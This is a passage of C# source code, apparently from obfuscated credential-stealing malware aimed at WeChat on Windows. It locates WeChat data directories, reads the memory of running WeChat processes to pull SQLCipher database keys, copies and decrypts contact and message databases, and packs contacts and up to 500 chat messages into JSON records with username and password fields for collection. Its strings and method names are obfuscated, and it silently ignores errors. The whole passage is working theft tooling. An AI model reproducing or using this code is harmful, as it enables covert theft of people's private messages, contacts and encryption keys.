                    foreach (string ini in Directory.GetFiles(Path.Combine(xwRoot, "config"), "*.ini"))
                    {
                        try
                        {
                            string dataPath = File.ReadAllText(ini).Trim();
                            if (string.IsNullOrEmpty(dataPath)) continue;
                            string xwFiles = Path.Combine(dataPath, "xwechat_files");
                            if (!Directory.Exists(xwFiles)) continue;
                            foreach (string userDir in Directory.GetDirectories(xwFiles))
                            {
                                string dirName = Path.GetFileName(userDir);
                                if (!dirName.StartsWith("wxid_")) continue;
                                string dbStorage = Path.Combine(userDir, "db_storage");
                                if (Directory.Exists(dbStorage))
                                {
                                    string wxid = dirName.Contains("_") ? dirName.Substring(0, dirName.LastIndexOf('_')) : dirName;
                                    dataDirs.Add(new string[] { dbStorage, wxid });
                                }
                            }
                        }
                        catch { }
                    }
                }
            }
            catch { }

            
            string[] searchRoots = new string[] {
                Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
            };
            try
            {
                using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Tencent\WeChat", false))
                {
                    if (key != null)
                    {
                        string regPath = key.GetValue("FileSavePath") as string;
                        if (!string.IsNullOrEmpty(regPath) && regPath != "MyDocument:")
                            searchRoots = new string[] { regPath };
                    }
                }
            }
            catch { }

            foreach (string root in searchRoots)
            {
                if (string.IsNullOrEmpty(root)) continue;
                string wechatBase = Path.Combine(root, _Q._S("O5xkr6qJx0RKb9RA"));
                if (!Directory.Exists(wechatBase)) continue;
                try
                {
                    foreach (string dir in Directory.GetDirectories(wechatBase))
                    {
                        string name = Path.GetFileName(dir);
                        if (name == "All Users" || name == "Applet" || name == "WMPF") continue;
                        if (Directory.Exists(Path.Combine(dir, "Msg")))
                            dataDirs.Add(new string[] { dir, name });
                    }
                }
                catch { }
            }

            if (dataDirs.Count == 0)
            {
                string usersRoot = Path.Combine(Environment.GetEnvironmentVariable("SystemDrive") ?? "C:", "Users");
                if (Directory.Exists(usersRoot))
                {
                    try
                    {
                        foreach (string ud in Directory.GetDirectories(usersRoot))
                        {
                            string dn = Path.GetFileName(ud).ToLowerInvariant();
                            if (dn == "public" || dn == "default" || dn == "default user" || dn == "all users") continue;
                            string wb = Path.Combine(ud, "Documents", _Q._S("O5xkr6qJx0RKb9RA"));
                            if (!Directory.Exists(wb)) continue;
                            foreach (string dir in Directory.GetDirectories(wb))
                            {
                                string name = Path.GetFileName(dir);
                                if (name == "All Users" || name == "Applet" || name == "WMPF") continue;
                                if (Directory.Exists(Path.Combine(dir, "Msg")))
                                    dataDirs.Add(new string[] { dir, name });
                            }
                        }
                    }
                    catch { }
                }
            }

            if (dataDirs.Count == 0) return first;

            
            byte[] extractedKey = null;
            string wechatVersion = "";
            string keyStatus = "";
            try { extractedKey = _leWvCobHXobEZGUHJlswtQiSKG(dataDirs, out wechatVersion); keyStatus = extractedKey != null ? "key_found" : "key_not_found"; }
            catch (Exception kex) { keyStatus = "key_error:" + kex.GetType().Name + ":" + kex.Message; }

            foreach (var info in dataDirs)
            {
                string dataDir = info[0];
                string wxid = info[1];

                
                if (!first) sb.Append(",");
                first = false;
                sb.Append(string.Format(
                    "{{\"source\":\"wechat\",\"target\":\"{0}\",\"username\":\"{1}\",\"password\":\"{2}\",\"type\":2}}",
                    _AexenijxeK("ver=" + wechatVersion + " dir=" + dataDir),
                    _AexenijxeK(wxid),
                    _AexenijxeK(keyStatus + (extractedKey != null ? " " + BytesToHex(extractedKey).Substring(0, 16) + "..." : ""))));

                
                var contactMap = new Dictionary<string, string>();
                int wxReserve = dataDir.Contains("db_storage") ? 80 : 48; 

                try
                {
                    
                    var dbSearchDirs = new List<string>();
                    dbSearchDirs.Add(dataDir);
                    string msgDir = Path.Combine(dataDir, "Msg");
                    if (Directory.Exists(msgDir)) dbSearchDirs.Add(msgDir);

                    var allDbs = new List<string>();
                    var contactDbs = new List<string>();
                    var messageDbs = new List<string>();
                    foreach (string searchDir in dbSearchDirs)
                    {
                        if (!Directory.Exists(searchDir)) continue;
                        foreach (string found in Directory.GetFiles(searchDir, "*.db", SearchOption.AllDirectories))
                        {
                            long sz = 0;
                            try { sz = new FileInfo(found).Length; } catch { }
                            if (sz < 4096 || sz > 200 * 1024 * 1024) continue;
                            string relPath = found.Length > dataDir.Length + 1 ? found.Substring(dataDir.Length + 1) : Path.GetFileName(found);
                            if (relPath.Split(Path.DirectorySeparatorChar).Length > 5) continue;
                            allDbs.Add(found);
                            string fn = Path.GetFileName(found).ToLowerInvariant();
                            if (fn == "micromsg.db" || fn == "contact.db") contactDbs.Add(found);
                            else if (fn == "chatmsg.db" || fn == "message.db" || (fn.StartsWith("message_") && fn.EndsWith(".db") && !fn.Contains("fts") && !fn.Contains("resource")))
                                messageDbs.Add(found);
                            if (allDbs.Count > 80) break;
                        }
                        if (allDbs.Count > 80) break;
                    }

                    
                    if (!first) sb.Append(",");
                    first = false;
                    sb.Append(string.Format(
                        "{{\"source\":\"wechat-db\",\"target\":\"总计{0}个DB, 联系人{1}个, 消息{2}个\",\"username\":\"{3}\",\"password\":\"reserve={4}\",\"type\":9}}",
                        allDbs.Count, contactDbs.Count, messageDbs.Count, _AexenijxeK(wxid), wxReserve));

                    
                    if (extractedKey != null)
                    {
                        
                        foreach (string cDb in contactDbs)
                        {
                            string fn = Path.GetFileName(cDb).ToLowerInvariant();
                            string decryptStatus = "";
                            try
                            {
                                string tmpDb = Path.Combine(Path.GetTempPath(), "wx_" + Guid.NewGuid().ToString("N").Substring(0, 6));
                                CopyLockedFile(cDb, tmpDb);
                                try
                                {
                                    byte[] encBytes = File.ReadAllBytes(tmpDb);
                                    byte[] decBytes = TryDecryptDb(extractedKey, encBytes, wxReserve, out decryptStatus);
                                    if (decBytes != null)
                                    {
                                        try { contactMap = _vpxrbDNCIuRVgnBEBak(decBytes); }
                                        catch (Exception ce) { decryptStatus += ",parse_err:" + ce.Message; }
                                    }
                                }
                                finally { try { File.Delete(tmpDb); } catch { } }
                            }
                            catch (Exception dex) { decryptStatus = "error:" + dex.GetType().Name; }
                            if (!first) sb.Append(",");
                            first = false;
                            sb.Append(string.Format(
                                "{{\"source\":\"wechat-decrypt\",\"target\":\"{0}\",\"username\":\"{1}\",\"password\":\"{2}\",\"type\":9}}",
                                _AexenijxeK(fn + " contacts=" + contactMap.Count), _AexenijxeK(wxid), _AexenijxeK(decryptStatus)));
                        }

                        
                        int totalExported = 0;
                        foreach (string mDb in messageDbs)
                        {
                            if (totalExported >= 500) break;
                            string fn = Path.GetFileName(mDb).ToLowerInvariant();
                            string decryptStatus = "";
                            try
                            {
                                string tmpDb = Path.Combine(Path.GetTempPath(), "wx_" + Guid.NewGuid().ToString("N").Substring(0, 6));
                                CopyLockedFile(mDb, tmpDb);
                                try
                                {
                                    byte[] encBytes = File.ReadAllBytes(tmpDb);
                                    byte[] decBytes = TryDecryptDb(extractedKey, encBytes, wxReserve, out decryptStatus);
                                    if (decBytes != null)
                                    {
                                        var messages = _PZVgQMjxqZFgEcpNFaf(decBytes, 300);
                                        decryptStatus += ",parsed=" + messages.Count;
                                        messages.Sort((a, b) => string.Compare(b[2], a[2], StringComparison.Ordinal));
                                        foreach (var msg in messages)
                                        {
                                            if (totalExported >= 500) break;
                                            if (string.IsNullOrEmpty(msg[1])) continue;
                                            string talkerDisplay = msg[0];
                                            if (contactMap.ContainsKey(msg[0]))
                                                talkerDisplay = contactMap[msg[0]] + "(" + msg[0] + ")";
                                            if (!first) sb.Append(",");
                                            first = false;
                                            sb.Append(string.Format(
                                                "{{\"source\":\"wechat-msg\",\"target\":\"{0}\",\"username\":\"{1}\",\"password\":\"{2}\",\"type\":9}}",
                                                _AexenijxeK(talkerDisplay),
                                                _AexenijxeK((msg[3] == "1" ? "[发]" : "[收]") + "[" + msg[4] + "] " + msg[1]),
                                                _AexenijxeK(msg[2])));
                                            totalExported++;
                                        }
                                    }
                                }
                                finally { try { File.Delete(tmpDb); } catch { } }
                            }
                            catch (Exception dex) { decryptStatus = "error:" + dex.GetType().Name; }
                            if (!first) sb.Append(",");
                            first = false;
                            sb.Append(string.Format(
                                "{{\"source\":\"wechat-decrypt\",\"target\":\"{0}\",\"username\":\"{1}\",\"password\":\"{2}\",\"type\":9}}",
                                _AexenijxeK(fn), _AexenijxeK(wxid), _AexenijxeK(decryptStatus)));
                        }
                        if (totalExported > 0)
                        {
                            if (!first) sb.Append(",");
                            first = false;
                            sb.Append(string.Format(
                                "{{\"source\":\"wechat-msg-summary\",\"target\":\"total_exported={0}\",\"username\":\"{1}\",\"password\":\"decrypted\",\"type\":9}}",
                                totalExported, _AexenijxeK(wxid)));
                        }
                    }
                    else
                    {
                        if (!first) sb.Append(",");
                        first = false;
                        sb.Append(string.Format(
                            "{{\"source\":\"wechat-decrypt\",\"target\":\"未提取到密钥\",\"username\":\"{0}\",\"password\":\"{1}\",\"type\":9}}",
                            _AexenijxeK(wxid), _AexenijxeK(keyStatus)));
                    }
                }
                catch (Exception ex2)
                {
                    if (!first) sb.Append(",");
                    first = false;
                    sb.Append(string.Format(
                        "{{\"source\":\"wechat-error\",\"target\":\"\",\"username\":\"{0}\",\"password\":\"{1}\",\"type\":9}}",
                        _AexenijxeK(wxid), _AexenijxeK("enum_error:" + ex2.GetType().Name + ":" + ex2.Message)));
                }
            }
            return first;
        }

        static string FormatSize(long bytes)
        {
            if (bytes < 1024) return bytes + "B";
            if (bytes < 1024 * 1024) return (bytes / 1024) + "KB";
            return (bytes / (1024 * 1024)) + "MB";
        }

        static string BytesToHex(byte[] data)
        {
            var hex = new StringBuilder(data.Length * 2);
            foreach (byte b in data) hex.Append(b.ToString("x2"));
            return hex.ToString();
        }

        
        
        [DllImport("kernel32.dll")]
        static extern bool VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);
        [StructLayout(LayoutKind.Sequential)]
        struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress, AllocationBase;
            public uint AllocationProtect;
            public IntPtr RegionSize;
            public uint State, Protect, Type;
        }

        List<KeyValuePair<byte[], byte[]>> ScanProcessForRawKeys(string[] processNames)
        {
            var results = new List<KeyValuePair<byte[], byte[]>>();
            var sw = System.Diagnostics.Stopwatch.StartNew();
            foreach (string pn in processNames)
            {
                Process[] procs;
                try { procs = Process.GetProcessesByName(pn); } catch { continue; }
                foreach (var proc in procs)
                {
                    IntPtr hProc = OpenProcess(0x0010 | 0x0400 | 0x0008, false, proc.Id);
                    if (hProc == IntPtr.Zero) continue;
                    try
                    {
                        long addr = 0x10000; 
                        while (addr < 0x7FFFFFFFFFFF)
                        {
                            if (sw.ElapsedMilliseconds > 30000) break; 
                            MEMORY_BASIC_INFORMATION mbi;
                            if (!VirtualQueryEx(hProc, new IntPtr(addr), out mbi, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)))) break;
                            long rSize = mbi.RegionSize.ToInt64();
                            if (rSize <= 0) break;
                            
                            bool readable = mbi.State == 0x1000 && rSize < 50 * 1024 * 1024
                                && (mbi.Protect & 0x104) == 0  
                                && (mbi.Protect & 0xEE) != 0;  
                            if (readable)
                            {
                                int chunkSz = (int)Math.Min(rSize, 2 * 1024 * 1024);
                                byte[] chunk = new byte[chunkSz];
                                for (long off = 0; off < rSize; off += chunkSz)
                                {
                                    if (sw.ElapsedMilliseconds > 30000) break;
                                    int rsz = (int)Math.Min(chunkSz, rSize - off);
                                    int rd;
                                    if (!ReadProcessMemory(hProc, new IntPtr(addr + off), chunk, rsz, out rd) || rd < 100) continue;
                                    for (int i = 0; i <= rd - 99; i++)
                                    {
                                        if (chunk[i] != 0x78 || chunk[i + 1] != 0x27 || chunk[i + 98] != 0x27) continue;
                                        bool ok = true;
                                        for (int j = 2; j < 98; j++)
                                        {
                                            byte b = chunk[i + j];
                                            if (!((b >= '0' && b <= '9') || (b >= 'a' && b <= 'f') || (b >= 'A' && b <= 'F'))) { ok = false; break; }
                                        }
                                        if (!ok) continue;
                                        string hex = Encoding.ASCII.GetString(chunk, i + 2, 96);
                                        byte[] ek = HexToBytes(hex.Substring(0, 64));
                                        byte[] sa = HexToBytes(hex.Substring(64, 32));
                                        bool dup = false;
                                        foreach (var ex2 in results) { bool same = true; for (int k = 0; k < 32; k++) if (ex2.Key[k] != ek[k]) { same = false; break; } if (same) { dup = true; break; } }
                                        if (!dup) results.Add(new KeyValuePair<byte[], byte[]>(ek, sa));
                                    }
                                }
                            }
                            addr += rSize; if (addr < 0) break;
                        }
                    }
                    finally { CloseHandle(hProc); }
                    if (results.Count > 0) break;
                }
                if (results.Count > 0) break;
            }
            return results;
        }

        
        byte[] FindRawKeyForDb(List<KeyValuePair<byte[], byte[]>> rawKeys, byte[] dbSalt16, byte[] dbFirstPage, int reserveSize)
        {
            
            foreach (var kv in rawKeys)
            {
                bool match = true;
                for (int i = 0; i < 16; i++) if (kv.Value[i] != dbSalt16[i]) { match = false; break; }
                if (!match) continue;
                if (VerifyRawKeyDecrypt(kv.Key, dbFirstPage, reserveSize)) return kv.Key;
            }
            
            foreach (var kv in rawKeys)
            {
                if (VerifyRawKeyDecrypt(kv.Key, dbFirstPage, reserveSize)) return kv.Key;
            }
            return null;
        }

        
        bool VerifyRawKeyDecrypt(byte[] encKey, byte[] page, int reserveSize)
        {
            if (page == null || page.Length < 4096) return false;
            int pageSize = 4096;
            int encLen = pageSize - 16 - reserveSize;
            if (encLen <= 0 || encLen % 16 != 0) return false;
            try
            {
                byte[] iv = new byte[16];
                Array.Copy(page, pageSize - reserveSize, iv, 0, 16);
                byte[] enc = new byte[encLen];
                Array.Copy(page, 16, enc, 0, encLen);
                byte[] dec;
                using (var aes = System.Security.Cryptography.Aes.Create())
                {
                    aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.None;
                    aes.Key = encKey; aes.IV = iv;
                    using (var d = aes.CreateDecryptor()) dec = d.TransformFinalBlock(enc, 0, enc.Length);
                }
                byte pt = dec[84]; 
                return pt == 0x0D || pt == 0x05; 
            }
            catch { return false; }
        }

        
        byte[] TryDecryptDb(byte[] encKey, byte[] encDb, int primaryReserve, out string status)
        {
            status = "sz=" + (encDb != null ? encDb.Length.ToString() : "null");
            if (encDb == null || encDb.Length < 4096) { status += ",too_small"; return null; }
            
            if (Encoding.ASCII.GetString(encDb, 0, Math.Min(6, encDb.Length)) == "SQLite") { status += ",plaintext"; return encDb; }
            byte[] dec = DecryptSQLCipherRawKey(encKey, encDb, primaryReserve);
            if (dec != null) { status += ",r" + primaryReserve + "_ok"; return dec; }
            status += ",r" + primaryReserve + "_fail";
            int alt = primaryReserve == 80 ? 48 : 80;
            dec = DecryptSQLCipherRawKey(encKey, encDb, alt);
            if (dec != null) { status += ",r" + alt + "_ok"; return dec; }
            status += ",r" + alt + "_fail";
            dec = _rjWkKIeLFgfdzQlbeY(encKey, encDb);
            if (dec != null) { status += ",pbkdf2_ok"; return dec; }
            status += ",pbkdf2_fail";
            return null;
        }

        
        byte[] DecryptSQLCipherRawKey(byte[] encKey, byte[] encDb, int reserveSize)
        {
            int pageSize = 4096;
            if (encDb == null || encDb.Length < pageSize) return null;
            int totalPages = encDb.Length / pageSize;
            byte[] output = new byte[totalPages * pageSize];
            for (int pg = 0; pg < totalPages; pg++)
            {
                int pgOff = pg * pageSize;
                int encStart = pg == 0 ? pgOff + 16 : pgOff;
                int encLen = pg == 0 ? pageSize - 16 - reserveSize : pageSize - reserveSize;
                if (encLen <= 0 || encLen % 16 != 0 || encStart + encLen > encDb.Length) break;
                byte[] iv = new byte[16];
                Array.Copy(encDb, pgOff + pageSize - reserveSize, iv, 0, 16);
                byte[] enc = new byte[encLen];
                Array.Copy(encDb, encStart, enc, 0, encLen);
                try
                {
                    byte[] dec;
                    using (var aes = System.Security.Cryptography.Aes.Create())
                    {
                        aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.None;
                        aes.Key = encKey; aes.IV = iv;
                        using (var d = aes.CreateDecryptor()) dec = d.TransformFinalBlock(enc, 0, enc.Length);
                    }
                    if (pg == 0)
                    {
                        byte[] hdr = Encoding.ASCII.GetBytes(_Q._S("P6hrrr+Yx2RMcdxSBTHn"));
                        Array.Copy(hdr, 0, output, 0, 15); output[15] = 0;
                        Array.Copy(dec, 0, output, 16, dec.Length);
                        output[16] = (byte)((pageSize >> 8) & 0xFF);
                        output[17] = (byte)(pageSize & 0xFF);
                        output[20] = (byte)reserveSize;
                    }
                    else Array.Copy(dec, 0, output, pgOff, dec.Length);
                }
                catch { return null; }
            }
            if (Encoding.ASCII.GetString(output, 0, 15) != _Q._S("P6hrrr+Yx2RMcdxSBTHn")) return null;
            if (output[100] != 0x0D && output[100] != 0x05) return null;
            return output;
        }

        byte[] _leWvCobHXobEZGUHJlswtQiSKG(List<string[]> dataDirs, out string version)
        {
            version = "";

            
            try
            {
                var wxProcs = Process.GetProcessesByName("Weixin");
                if (wxProcs.Length == 0) wxProcs = Process.GetProcessesByName(_Q._S("O5xkr6qJ"));
                if (wxProcs.Length > 0)
                {
                    try { version = wxProcs[0].MainModule.FileVersionInfo.FileVersion; } catch { }
                }
            }
            catch { }

            
            var rawKeys = ScanProcessForRawKeys(new string[] { "Weixin", "WeChatAppEx", _Q._S("O5xkr6qJ") });
            if (rawKeys.Count == 0) return null;

            
            foreach (var info in dataDirs)
            {
                string dataDir = info[0];
                try
                {
                    
                    string[] searchDirs = new string[] { dataDir, Path.Combine(dataDir, "Msg") };
                    foreach (string sd in searchDirs)
                    {
                        if (!Directory.Exists(sd)) continue;
                        foreach (string f in Directory.GetFiles(sd, "*.db", SearchOption.AllDirectories))
                        {
                            try
                            {
                                long sz = new FileInfo(f).Length;
                                if (sz < 4096) continue;
                                byte[] page1 = new byte[4096];
                                using (var fs = new FileStream(f, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete))
                                    fs.Read(page1, 0, 4096);
                                if (Encoding.ASCII.GetString(page1, 0, 6) == "SQLite") continue;
                                byte[] salt = new byte[16];
                                Array.Copy(page1, 0, salt, 0, 16);
                                
                                foreach (int res in new int[] { 80, 48 })
                                {
                                    byte[] key = FindRawKeyForDb(rawKeys, salt, page1, res);
                                    if (key != null) return key;
                                }
                            }
                            catch { }
                        }
                    }
                }
                catch { }
            }

            
            return rawKeys.Count > 0 ? rawKeys[0].Key : null;
        }

        static int CountDistinctBytes(byte[] data)
        {
            bool[] seen = new bool[256];
            int count = 0;
            foreach (byte b in data)
            {
                if (!seen[b]) { seen[b] = true; count++; }
            }
            return count;
        }

        bool _dYQgOteVWTTzgGEim(byte[] candidateKey, byte[] dbFirstPage)
        {
            
            
            if (_rEpAtSeJsxBVkeLSYgkhd(candidateKey, dbFirstPage)) return true;
            
            
            if (_TfVwbZDlGluLIcASizvzc(candidateKey, dbFirstPage)) return true;
            return false;
        }

        bool _rEpAtSeJsxBVkeLSYgkhd(byte[] key, byte[] page)
        {
            try
            {
                int pageSize = 4096, reserveSize = 48;
                if (page == null || page.Length < pageSize) return false;

                byte[] salt = new byte[16];
                Array.Copy(page, 0, salt, 0, 16);

                
                byte[] encKey;
                using (var kdf = new Rfc2898DeriveBytes(key, salt, 64000))
                    encKey = kdf.GetBytes(32);

                
                byte[] hmacSalt = new byte[16];
                for (int i = 0; i < 16; i++) hmacSalt[i] = (byte)(salt[i] ^ 0x3a);
                byte[] hmacKey;
                using (var kdf = new Rfc2898DeriveBytes(encKey, hmacSalt, 2))
                    hmacKey = kdf.GetBytes(32);

                
                int dataLen = pageSize - 16 - reserveSize;
                byte[] hmacInput = new byte[dataLen + 16 + 4];
                Array.Copy(page, 16, hmacInput, 0, dataLen);
                Array.Copy(page, pageSize - reserveSize, hmacInput, dataLen, 16); 
                hmacInput[dataLen + 16] = 1; 

                byte[] computed;
                using (var hmac = new HMACSHA1(hmacKey))
                    computed = hmac.ComputeHash(hmacInput);

                
                for (int i = 0; i < 20; i++)
                    if (page[pageSize - reserveSize + 16 + i] != computed[i]) return false;
                return true;
            }
            catch { return false; }
        }

        bool _TfVwbZDlGluLIcASizvzc(byte[] key, byte[] page)
        {
            try
            {
                int pageSize = 4096, reserveSize = 48;
                if (page == null || page.Length < pageSize) return false;

                byte[] salt = new byte[16];
                Array.Copy(page, 0, salt, 0, 16);

                
                byte[] encKey = PBKDF2_SHA512(key, salt, 256000, 32);

                
                byte[] hmacSalt = new byte[16];
                for (int i = 0; i < 16; i++) hmacSalt[i] = (byte)(salt[i] ^ 0x3a);
                byte[] hmacKey = PBKDF2_SHA512(encKey, hmacSalt, 2, 32);

                
                int dataLen = pageSize - 16 - reserveSize;
                byte[] hmacInput = new byte[dataLen + 16 + 4];
                Array.Copy(page, 16, hmacInput, 0, dataLen);
                Array.Copy(page, pageSize - reserveSize, hmacInput, dataLen, 16);
                hmacInput[dataLen + 16] = 1;

                byte[] computed;
                using (var hmac = new HMACSHA512(hmacKey))
                    computed = hmac.ComputeHash(hmacInput);

                
                int hmacStoreLen = reserveSize - 16;
                for (int i = 0; i < hmacStoreLen; i++)
                    if (page[pageSize - reserveSize + 16 + i] != computed[i]) return false;
                return true;
            }
            catch { return false; }
        }

        
        static byte[] PBKDF2_SHA512(byte[] password, byte[] salt, int iterations, int dkLen)
        {
            int hLen = 64;
            int blocks = (dkLen + hLen - 1) / hLen;
            byte[] dk = new byte[dkLen];
            for (int block = 1; block <= blocks; block++)
            {
                byte[] saltBlock = new byte[salt.Length + 4];
                Array.Copy(salt, saltBlock, salt.Length);
                saltBlock[salt.Length]     = (byte)((block >> 24) & 0xFF);
                saltBlock[salt.Length + 1] = (byte)((block >> 16) & 0xFF);
                saltBlock[salt.Length + 2] = (byte)((block >> 8) & 0xFF);
                saltBlock[salt.Length + 3] = (byte)(block & 0xFF);

                byte[] u;
                using (var hmac = new HMACSHA512(password))
                    u = hmac.ComputeHash(saltBlock);
                byte[] result = (byte[])u.Clone();

                for (int i = 1; i < iterations; i++)
                {
                    using (var hmac = new HMACSHA512(password))
                        u = hmac.ComputeHash(u);
                    for (int j = 0; j < hLen; j++)
                        result[j] ^= u[j];
                }

                int copyLen = Math.Min(hLen, dkLen - (block - 1) * hLen);
                Array.Copy(result, 0, dk, (block - 1) * hLen, copyLen);
            }
            return dk;
        }

        
        byte[] _rjWkKIeLFgfdzQlbeY(byte[] rawKey, byte[] encDb)
        {
            int pageSize = 4096, reserveSize = 48;
            if (encDb == null || encDb.Length < pageSize) return null;

            byte[] salt = new byte[16];
            Array.Copy(encDb, 0, salt, 0, 16);

            
            byte[] encKey, hmacKey;
            {
                
                using (var kdf = new Rfc2898DeriveBytes(rawKey, salt, 64000))
                    encKey = kdf.GetBytes(32);
                byte[] hs3 = new byte[16];
                for (int i = 0; i < 16; i++) hs3[i] = (byte)(salt[i] ^ 0x3a);
                using (var kdf = new Rfc2898DeriveBytes(encKey, hs3, 2))
                    hmacKey = kdf.GetBytes(32);

                
                if (!_YGDnabpZNQYcxD(encDb, 0, encKey, hmacKey, pageSize, reserveSize, false))
                {
                    
                    encKey = PBKDF2_SHA512(rawKey, salt, 256000, 32);
                    byte[] hs4 = new byte[16];
                    for (int i = 0; i < 16; i++) hs4[i] = (byte)(salt[i] ^ 0x3a);
                    hmacKey = PBKDF2_SHA512(encKey, hs4, 2, 32);
                    if (!_YGDnabpZNQYcxD(encDb, 0, encKey, hmacKey, pageSize, reserveSize, true))
                        return null;
                }
            }

            int totalPages = encDb.Length / pageSize;
            byte[] output = new byte[totalPages * pageSize];

            for (int pg = 0; pg < totalPages; pg++)
            {
                int pgOff = pg * pageSize;
                int encStart, encLen;
                if (pg == 0) { encStart = pgOff + 16; encLen = pageSize - 16 - reserveSize; }
                else { encStart = pgOff; encLen = pageSize - reserveSize; }

                if (encStart + encLen > encDb.Length) break;

                byte[] iv = new byte[16];
                Array.Copy(encDb, pgOff + pageSize - reserveSize, iv, 0, 16);
                byte[] encrypted = new byte[encLen];
                Array.Copy(encDb, encStart, encrypted, 0, encLen);

                byte[] decrypted;
                using (var aes = System.Security.Cryptography.Aes.Create())
                {
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.None;
                    aes.Key = encKey;
                    aes.IV = iv;
                    using (var dec = aes.CreateDecryptor())
                        decrypted = dec.TransformFinalBlock(encrypted, 0, encrypted.Length);
                }

                if (pg == 0)
                {
                    byte[] hdr = Encoding.ASCII.GetBytes(_Q._S("P6hrrr+Yx2RMcdxSBTHn"));
                    Array.Copy(hdr, 0, output, 0, 15);
                    output[15] = 0;
                    Array.Copy(decrypted, 0, output, 16, decrypted.Length);
                    
                    output[16] = (byte)((pageSize >> 8) & 0xFF);
                    output[17] = (byte)(pageSize & 0xFF);
                    output[20] = (byte)reserveSize; 
                }
                else
                {
                    Array.Copy(decrypted, 0, output, pgOff, decrypted.Length);
                }
            }

            
            if (Encoding.ASCII.GetString(output, 0, 15) != _Q._S("P6hrrr+Yx2RMcdxSBTHn")) return null;
            return output;
        }

        bool _YGDnabpZNQYcxD(byte[] db, int pgOff, byte[] encKey, byte[] hmacKey, int pageSize, int reserveSize, bool useSHA512)
        {
            int dataStart = (pgOff == 0) ? 16 : 0;
            int dataLen = pageSize - dataStart - reserveSize;
            byte[] hmacInput = new byte[dataLen + 16 + 4];
            Array.Copy(db, pgOff + dataStart, hmacInput, 0, dataLen);
            Array.Copy(db, pgOff + pageSize - reserveSize, hmacInput, dataLen, 16); 
            hmacInput[dataLen + 16] = 0; hmacInput[dataLen + 17] = 0;
            hmacInput[dataLen + 18] = 0; hmacInput[dataLen + 19] = 1; 

            byte[] computed;
            if (useSHA512)
            {
                using (var hmac = new HMACSHA512(hmacKey)) computed = hmac.ComputeHash(hmacInput);
                int cmpLen = Math.Min(reserveSize - 16, computed.Length);
                for (int i = 0; i < cmpLen; i++)
                    if (db[pgOff + pageSize - reserveSize + 16 + i] != computed[i]) return false;
            }
            else
            {
                using (var hmac = new HMACSHA1(hmacKey)) computed = hmac.ComputeHash(hmacInput);
                for (int i = 0; i < 20 && i < computed.Length; i++)
                    if (db[pgOff + pageSize - reserveSize + 16 + i] != computed[i]) return false;
            }
            return true;
        }

        
        List<string[]> _PZVgQMjxqZFgEcpNFaf(byte[] dbData, int maxMessages)
        {
            
            var results = new List<string[]>();
            if (dbData == null || dbData.Length < 100) return results;
            if (Encoding.ASCII.GetString(dbData, 0, 15) != _Q._S("P6hrrr+Yx2RMcdxSBTHn")) return results;

            int pageSize = (dbData[16] << 8) | dbData[17];
            if (pageSize == 1) pageSize = 65536;
            if (pageSize < 512) return results;
            int reserveBytes = dbData[20];

            int totalPages = dbData.Length / pageSize;
            int usableSize = pageSize - reserveBytes;

            
            int msgRootPage = -1;
            int talkerColIdx = -1, contentColIdx = -1, typeColIdx = -1, senderColIdx = -1, timeColIdx = -1;

            try
            {
                int pg0Hdr = 100; 
                if (dbData[pg0Hdr] == 0x0D) 
                {
                    int cellCount = (dbData[pg0Hdr + 3] << 8) | dbData[pg0Hdr + 4];
                    int ptrStart = pg0Hdr + 8;
                    for (int c = 0; c < cellCount && c < 100; c++)
                    {
                        int ptrOff = ptrStart + c * 2;
                        if (ptrOff + 2 > dbData.Length) break;
                        int cellOff = (dbData[ptrOff] << 8) | dbData[ptrOff + 1];
                        if (cellOff >= dbData.Length || cellOff < 0) continue;

                        try
                        {
                            
                            int p = cellOff;
                            int n;
                            long payloadLen;
                            ReadVarint(dbData, p, out payloadLen, out n); p += n;
                            long rowid;
                            ReadVarint(dbData, p, out rowid, out n); p += n;

                            long recHdrSize;
                            int hb;
                            ReadVarint(dbData, p, out recHdrSize, out hb);
                            int recHdrEnd = p + (int)recHdrSize;
                            int hp = p + hb;

                            var colTypes = new List<long>();
                            while (hp < recHdrEnd && hp < dbData.Length)
                            {
                                long st;
                                ReadVarint(dbData, hp, out st, out n);
                                hp += n;
                                colTypes.Add(st);
                            }

                            if (colTypes.Count < 5) continue;

                            
                            int dp = recHdrEnd;
                            string objName = null, sqlText = null;
                            long rootPage = 0;

                            for (int col = 0; col < colTypes.Count && dp < dbData.Length; col++)
                            {
                                long st = colTypes[col];
                                int colLen = SqliteColSize(st);
                                if (dp + colLen > dbData.Length) break;

                                if (col == 1 && st >= 13 && st % 2 == 1)
                                {
                                    int tl = (int)(st - 13) / 2;
                                    if (tl > 0 && dp + tl <= dbData.Length)
                                        objName = Encoding.UTF8.GetString(dbData, dp, tl);
                                }
                                else if (col == 3)
                                    rootPage = ReadSqliteInt(dbData, dp, colLen);
                                else if (col == 4 && st >= 13 && st % 2 == 1)
                                {
                                    int tl = (int)(st - 13) / 2;
                                    if (tl > 0 && dp + tl <= dbData.Length)
                                        sqlText = Encoding.UTF8.GetString(dbData, dp, tl);
                                }

                                dp += colLen;
                            }

                            
                            if (objName != null && rootPage > 0 &&
                                (objName.Equals("MSG", StringComparison.OrdinalIgnoreCase) ||
                                 objName.Equals("message", StringComparison.OrdinalIgnoreCase)))
                            {
                                msgRootPage = (int)rootPage;

                                
                                if (sqlText != null)
                                {
                                    string sqlUpper = sqlText.ToUpperInvariant();
                                    
                                    int paren = sqlText.IndexOf('(');
                                    if (paren > 0)
                                    {
                                        string colDefs = sqlText.Substring(paren + 1).TrimEnd(')', ' ');
                                        string[] cols = colDefs.Split(',');
                                        for (int ci = 0; ci < cols.Length; ci++)
                                        {
                                            string colName = cols[ci].Trim().Split(' ')[0].Trim('"', '`', '[', ']').ToUpperInvariant();
                                            if (colName == "STRTALKER") talkerColIdx = ci;
                                            else if (colName == "STRCONTENT") contentColIdx = ci;
                                            else if (colName == "TYPE") typeColIdx = ci;
                                            else if (colName == "ISSENDER") senderColIdx = ci;
                                            else if (colName == "CREATETIME") timeColIdx = ci;
                                        }
                                    }
                                }
                                break;
                            }
                        }
